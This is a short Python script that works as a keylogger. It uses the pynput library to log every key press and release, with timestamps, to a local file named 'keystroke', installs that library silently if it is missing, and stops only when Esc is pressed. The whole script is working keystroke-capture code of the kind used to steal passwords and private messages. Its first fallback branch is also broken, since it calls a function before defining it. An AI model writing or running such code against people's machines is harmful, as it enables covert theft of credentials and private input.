import sys
try:
	from os import system as syst

except:
	syst('pip install pynput')
	syst('cls')
	try:
		from os import system as syst
	except:
		sys.exit()

try:
	from pynput.keyboard import Key, Listener

except:
	syst('pip install pynput')
	syst('cls')
	try:
		from pynput.keyboard import Key, Listener
	except:
		sys.exit()

import logging

logging.basicConfig(filename='keystroke' , level = logging.DEBUG , format = '%(asctime)s : %(message)s')

def on_press(key) :
	logging.info('\t'+str(key))

def on_release(key) :
	logging.info('\t'*4+str(key))
	if key == Key.esc :
		return False

with Listener(on_press=on_press,on_release=on_release) as listener :
	listener.join()
